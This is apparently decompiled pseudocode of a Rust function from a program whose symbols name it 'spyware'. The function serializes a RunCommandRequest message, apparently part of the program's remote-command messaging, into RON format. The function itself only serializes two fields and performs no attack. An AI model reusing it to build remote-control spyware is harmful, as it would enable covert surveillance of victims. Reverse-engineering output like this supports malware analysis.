int * _ZN7spyware13communication8messages1_103__LT_impl_u20_serde__ser__Serialize_u20_for_u20_spyware__communication__messages__RunCommandRequest_GT_9serialize17h05e636ca783c8b29E
                (int *param_1,long param_2,undefined8 param_3)

{
  int local_50;
  int iStack_4c;
  undefined8 uStack_48;
  undefined local_40;
  undefined7 uStack_3f;
  undefined uStack_38;
  undefined7 uStack_37;
  undefined local_30;
  undefined7 uStack_2f;
  undefined8 uStack_28;
  undefined8 local_20;
  undefined local_18;
  
  _ZN84__LT__RF_mut_u20_ron__ser__Serializer_LT_W_GT__u20_as_u20_serde__ser__Serializer_GT_16serialize_struct17h19528d03ac3c512bE
            (&local_50,param_3,&DAT_0011246a,0x11,2);
  if (local_50 == 0x21) {
    local_20 = uStack_48;
    local_18 = local_40;
    _ZN75__LT_ron__ser__Compound_LT_W_GT__u20_as_u20_serde__ser__SerializeStruct_GT_15serialize_field17h0fe0e64abb5f6595E
              (&local_50,&local_20,&DAT_0011247b,7,param_2);
    if ((local_50 == 0x21) &&
       (_ZN75__LT_ron__ser__Compound_LT_W_GT__u20_as_u20_serde__ser__SerializeStruct_GT_15serialize_field17h5fa12f786d5654e5E
                  (&local_50,&local_20,&DAT_00112482,9,param_2 + 0x18), local_50 == 0x21)) {
      _ZN75__LT_ron__ser__Compound_LT_W_GT__u20_as_u20_serde__ser__SerializeStruct_GT_3end17h1114ba35daa4ac40E
                (param_1,local_20,local_18);
      return param_1;
    }
    *(ulong *)(param_1 + 8) = CONCAT71(uStack_2f,local_30);
    *(undefined8 *)(param_1 + 10) = uStack_28;
    *(ulong *)(param_1 + 4) = CONCAT71(uStack_3f,local_40);
    *(ulong *)(param_1 + 6) = CONCAT71(uStack_37,uStack_38);
    *(ulong *)param_1 = CONCAT44(iStack_4c,local_50);
    *(undefined8 *)(param_1 + 2) = uStack_48;
  }
  else {
    *(ulong *)(param_1 + 8) = CONCAT71(uStack_2f,local_30);
    *(undefined8 *)(param_1 + 10) = uStack_28;
    *(ulong *)((long)param_1 + 0x11) = CONCAT17(uStack_38,uStack_3f);
    *(ulong *)((long)param_1 + 0x19) = CONCAT17(local_30,uStack_37);
    *param_1 = local_50;
    param_1[1] = iStack_4c;
    *(undefined8 *)(param_1 + 2) = uStack_48;
    *(undefined *)(param_1 + 4) = local_40;
  }
  return param_1;
}